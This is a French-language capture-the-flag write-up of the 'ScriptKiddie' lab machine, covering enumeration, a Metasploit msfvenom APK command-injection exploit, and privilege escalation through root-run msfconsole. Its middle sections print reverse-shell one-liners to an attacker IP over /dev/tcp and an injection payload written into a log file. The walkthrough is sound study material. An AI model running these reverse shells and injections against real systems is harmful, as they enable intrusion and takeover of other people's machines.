# ScriptKiddie [Linux] Easy

# — 1.Enumeration —

## Nmap

`nmap -sS -A -sC -sV -p- 10.10.10.226`

```bash
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)

5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
http-title: k1d'5 h4ck3r t00l5
http-server-header: Werkzeug/0.16.1 Python/3.8.5
```

## Le Site

Sur le site internet du port 5000 nous avons 3 outils nous permettant de :

- Faire un scan Top 100 d’une ip donné
- Créé un payload avec msfvenom
- Exécuter la commande searchsploit

J’ai essayé de :

Utiliser le scan pour obtenir un shell

`10.10.14.16 | bash -i >& /dev/tcp/10.0.14.16/4242 0>&1`

Utiliser le payload generator et de mettre un mauvais lhost ou de mettre un mauvais fichier template.

Utiliser le sploits pour créé un shell.

En sommes l’injection de code ne marche pas sur ce site nous devons trouver un autre moyen d’exploiter ce site.

## FFuf

`ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u [http://10.10.10.226:5000/FUZZ](http://10.10.10.226:5000/FUZZ)`

On obtient aucune autre page ou dossier.

## MetaSploit

En cherchant par rapport au différentes fonctionnalités du site on trouve un exploit de metasploit par rapport à la génération d’APK Android.

[https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection](https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection)

On va donc utiliser l’exploit : `exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection`

On créé un APK avec nos host et notre cible puis nous envoyons l’APK sur le site

![Untitled](ScriptKiddie%20%5BLinux%5D%20Easy%20cb35f138d02a4b64a6b281a28499ae07/Untitled.png)

`nc -lvnp 4242`

## — 2.Shell as Kid —

![Untitled](ScriptKiddie%20%5BLinux%5D%20Easy%20cb35f138d02a4b64a6b281a28499ae07/Untitled%201.png)

Nous sommes maintenant kid mais nous avons un shell limité donc nous allons l’upgrade avec TTY.

```bash
$ nc -lnvp 7575
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
Ncat: Connection from 10.129.153.127.
Ncat: Connection from 10.129.153.127:47952.
python3 -c 'import pty;pty.spawn("/bin/bash")'
kid@scriptkiddie:~/html$ export TERM=xterm
export TERM=xterm
kid@scriptkiddie:~/html$ ^Z
[1]+  Stopped                 nc -lnvp 7575
$ stty raw -echo;fg
nc -lnvp 7575

kid@scriptkiddie:~/html$ stty rows 55 cols 236
kid@scriptkiddie:~/html$
```

On peux recevoir le premier flag dans le dossier de l’user kid.

J’ai lancé un linPeas (script d’énumération) sur la machine et j’ai trouvé un autres user que kid et root, pwn 

```bash
╔══════════╣ Users with console
kid:x:1000:1000:kid:/home/kid:/bin/bash                                                                           
pwn:x:1001:1001::/home/pwn:/bin/bash
root:x:0:0:root:/root:/bin/bash
```

On énumère les fichier de ce user :

`find /home/pwn -type f -readable -ls 2>/dev/null`

```bash
7671      4 -rw-r--r--   1 pwn      pwn           220 Feb 25  2020 /home/pwn/.bash_logout
7677      4 -rw-rw-r--   1 pwn      pwn            74 Jan 28  2021 /home/pwn/.selected_editor
7673      4 -rw-r--r--   1 pwn      pwn          3771 Feb 25  2020 /home/pwn/.bashrc
7675      4 -rw-r--r--   1 pwn      pwn           807 Feb 25  2020 /home/pwn/.profile
7779      4 -rwxrwxr--   1 pwn      pwn           250 Jan 28  2021 /home/pwn/scanlosers.sh
```

On a donc le script [scanlosers.sh](http://scanlosers.sh) qui contient :

```bash
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```

Un seul caractère d'espace est utilisé comme séparateur de champ ( -d' ' ) et tous les champs commençant par le troisième ( -f3- ) sont considérés comme faisant partie de l'adresse IP.
considérés comme faisant partie de l'adresse IP. De plus, aucune validation de l'entrée n'est effectuée, ce qui rend le script
vulnérable à l'injection de commandes OS arbitraires.

Dans le code de l’application web on vois aussi que l’app écrit dans /home/kid/logs/hackers

![Untitled](ScriptKiddie%20%5BLinux%5D%20Easy%20cb35f138d02a4b64a6b281a28499ae07/Untitled%202.png)

Test d’injection :

`f="/home/kid/logs/hackers"; echo test > $f ; cat $f ; sleep 1 ; cat $f`

On reçoit bien test dans le shell

Maintenant nous pouvons faire un payload plus sérieux :

`echo 'a b $(bash -c "bash -i &>/dev/tcp/10.10.14.16/7777 0>&1")' > /home/kid/logs/hackers` et un listener `nc -lvnp 7777`

On obtient un shell en tant que pwn.

# — 3.ShellAsPwn —

Nous voilà maintenant pwn user 

![Untitled](ScriptKiddie%20%5BLinux%5D%20Easy%20cb35f138d02a4b64a6b281a28499ae07/Untitled%203.png)

On peux repartir sur la face d’énumération de l’user (pwn). 

`sudo -l` :

```bash
pwn@scriptkiddie:~$ sudo -l
sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
```

Pour exploiter msfconsole :

`sudo msfconsole`

[https://www.darkoperator.com/blog/2017/10/21/basics-of-the-metasploit-framework-irb-setup](https://www.darkoperator.com/blog/2017/10/21/basics-of-the-metasploit-framework-irb-setup)

```bash
msf6 > irb
system("/bin/bash")
id
uid=0(root) gid=0(root) groups=0(root)
```